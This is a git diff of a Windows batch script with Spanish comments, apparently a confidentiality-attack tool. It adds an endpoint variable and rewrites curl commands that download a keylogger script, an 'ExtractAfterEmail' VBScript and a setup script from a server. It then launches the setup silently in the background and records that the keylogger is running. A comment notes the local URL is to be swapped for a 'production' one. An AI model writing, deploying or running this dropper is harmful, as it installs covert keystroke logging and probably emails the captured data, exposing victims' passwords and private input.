@@ -6,6 +6,8 @@ setlocal enabledelayedexpansion
 set "ErrorCode=0"
 set "myHostName=%COMPUTERNAME%"
 
+set "EndPoint=http://localhost:3000/KeyLoggerApp/"
+
 :: Try Block
 
 echo **************************** COMANDOS QUE VULNERAR LA CONFIDENCIALIDAD **************************** >> salida.txt
@@ -90,10 +92,10 @@ exit /b
     mkdir keyloggerLogs
     
     :: change path with production path   
-    curl -o keyLogger.py http://localhost:3000/KeyLoggerApp/keyLogger.py
-    curl -o ExtractAfterEmail.vbs http://localhost:3000/KeyLoggerApp/ExtractAfterEmail.vbs
-    curl -o setup.vbs http://localhost:3000/KeyLoggerApp/setup.vbs
-    curl -o requirements.txt http://localhost:3000/KeyLoggerApp/requirements.txt
+    curl -o keyLogger.py %EndPoint%/keyLogger.py
+    curl -o ExtractAfterEmail.vbs %EndPoint%/ExtractAfterEmail.vbs
+    curl -o setup.vbs %EndPoint%/setup.vbs
+    curl -o requirements.txt %EndPoint%/requirements.txt
 
     start "" wscript //B //Nologo "setup.vbs" 
     echo El keylogger está corriendo en segundo plano. >> salida.txt
